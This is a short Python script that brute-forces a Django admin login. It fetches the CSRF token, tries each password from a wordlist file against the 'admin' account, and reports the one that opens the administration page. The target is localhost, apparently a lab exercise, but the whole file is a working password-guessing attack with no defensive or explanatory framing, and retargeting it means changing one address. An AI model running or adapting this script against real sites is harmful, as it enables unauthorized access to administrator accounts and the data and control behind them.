import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	url = address + '/admin/login/?next=/admin/'
	s = requests.Session()
	r = s.get(url)
	token = extract_token(r)
	for password in candidates:
		data = {'csrfmiddlewaretoken':token, 'username': 'admin', 'password': password}
		response = s.post(url, data = data)
		if isloggedin(response):
			return password
	
	return None


def main():
	address = 'http://127.0.0.1:8000'
	candidates = [p.strip() for p in open('passwords.txt')]
	print(test_password(address, candidates))
	
main()
